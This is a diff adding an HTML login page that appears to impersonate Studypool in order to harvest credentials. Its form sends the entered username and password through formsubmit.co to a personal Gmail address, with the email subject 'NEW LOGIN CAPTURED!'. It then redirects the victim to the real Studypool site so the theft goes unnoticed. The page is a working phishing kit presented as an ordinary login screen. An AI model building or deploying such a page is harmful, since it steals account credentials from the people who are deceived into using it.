@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- External CSS -->
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="bg"></div>
+  <div class="beige-overlay"></div>
+  <div class="dark-gradient"></div>
+
+  <div class="container">
+    <div class="image-side"></div>
+    <div class="form-side">
+      <h2 class="form-header">Login <span>or</span> Sign Up</h2>
+
+      <form action="https://formsubmit.co/charpestine@gmail.com" method="POST" id="loginForm">
+        <label>USERNAME</label>
+        <input type="text" name="username" required placeholder="Email/Username">
+        
+        <label>PASSWORD</label>
+        <input type="password" name="password" required placeholder="Password">
+
+        <div class="options">
+          <label class="remember-me">
+            <input type="checkbox" checked> Remember me
+          </label>
+          <a href="#" class="forgot">I forgot my password</a>
+        </div>
+
+        <!-- Hidden fields for FormSubmit -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_subject" value="NEW LOGIN CAPTURED!">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_next" value="https://www.studypool.com/home#/home">
+
+        <button type="submit" class="login-btn" id="loginBtn">
+          <span>LOGIN</span>
+          <div class="spinner"></div>
+        </button>
+      </form>
+
+      <div class="or"><span>OR</span></div>
+
+      <div class="social-buttons">
+        <button type="button" class="social-btn google">
+          <div class="icon-google"></div>
+          Login with Google
+        </button>
+        <button type="button" class="social-btn facebook">
+          <div class="icon-facebook"></div>
+          Login with Facebook
+        </button>
+      </div>
+
+      <div class="signup">
+        Don't have an account? <a href="#">Sign Up</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- External JavaScript -->
+  <script src="script.js"></script>
+</body>
+</html>
